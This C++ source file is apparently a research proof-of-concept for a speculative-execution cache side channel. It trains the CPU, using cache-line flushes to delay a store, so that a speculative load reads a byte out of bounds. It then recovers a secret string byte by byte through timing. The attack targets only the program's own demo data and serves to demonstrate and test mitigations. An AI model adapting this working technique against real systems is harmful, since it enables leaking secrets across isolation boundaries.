/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

// TODO(asteinha): Deflake on ARM.

#include <array>
#include <cstring>
#include <iostream>

#include "cache_sidechannel.h"
#include "instr.h"
#include "utils.h"

// Objective: given some control over accesses to the *non-secret* string
// "Hello, world!", construct a program that obtains "It's a s3kr3t!!!" without
// ever accessing it in the C++ execution model, using speculative execution and
// side channel attacks
//
const char *public_data = "Hello, world!";
const char *private_data = "It's a s3kr3t!!!";
constexpr size_t kArrayLength = 64;

// Leaks the byte that is physically located at &text[0] + offset, without ever
// loading it. In the abstract machine, and in the code executed by the CPU,
// this function does not load any memory except for what is in the bounds
// of `text`, and local auxiliary data.
//
// Instead, the leak is performed by accessing out-of-bounds during speculative
// execution, bypassing the bounds check by training the branch predictor to
// think that the value will be in-range.
static char leak_byte(const char *data, size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
  std::unique_ptr<std::array<size_t *, kArrayLength>> array_of_pointers =
      std::unique_ptr<std::array<size_t *, kArrayLength>>(
          new std::array<size_t *, kArrayLength>);

  for (int run = 0;; ++run) {
    sidechannel.FlushOracle();

    // We pick a different offset every time so that it's guaranteed that the
    // value of the in-bounds access is usually different from the secret value
    // we want to leak via out-of-bounds speculative access.
    size_t safe_offset = run % strlen(data);

    // Junk value and stack value with the offset that will be used for
    // accessing the oracle.
    size_t junk, local_offset;

    // Array of pointers initialized so that each array item points initially to
    // the junk value.
    for (auto &pointer : *array_of_pointers) {
      pointer = &junk;
    }

    // One of the pointers is changed so that it points to the local offset
    // value.
    size_t local_pointer_index = run % kArrayLength;
    (*array_of_pointers)[local_pointer_index] = &local_offset;

    for (size_t i = 0; i <= local_pointer_index; ++i) {
      // This is the same as:
      // local_offset = (i == local_pointer_index) ? offset : safe_offset;
      // Only when i is at the local_pointer_offset it assigns the unsafe
      // offset to the local_offset.
      local_offset =
          offset + (safe_offset - offset) * static_cast<bool>(
              i - local_pointer_index);

      // We always flush the pointer, so that its access is slower.
      CLFlush(&(*array_of_pointers)[i]);
      CLFlush(array_of_pointers.get());

      // When i is at the local_pointer_index, we slowly copy safe_offset into
      // the local_offset. Otherwise we just copy the safe_offset to junk. After
      // this operation, the local_offset is always equal to the safe_offset.
      (*array_of_pointers)[i][0] = safe_offset;

      // Speculative fetch at the local_offset. Architecturally it fetches
      // always at the safe_offset, though speculatively it prefetches the
      // unsafe offset when i is at the local_pointer_index.
      ForceRead(isolated_oracle.data() + static_cast<size_t>(
          data[local_offset]));
    }

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(data[safe_offset]);
    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  std::cout << "Leaking the string: ";
  std::cout.flush();
  const size_t private_offset = private_data - public_data;
  for (size_t i = 0; i < strlen(private_data); ++i) {
    // On at least some machines, this will print the i'th byte from
    // private_data, despite the only actually-executed memory accesses being
    // to valid bytes in public_data.
    std::cout << leak_byte(public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
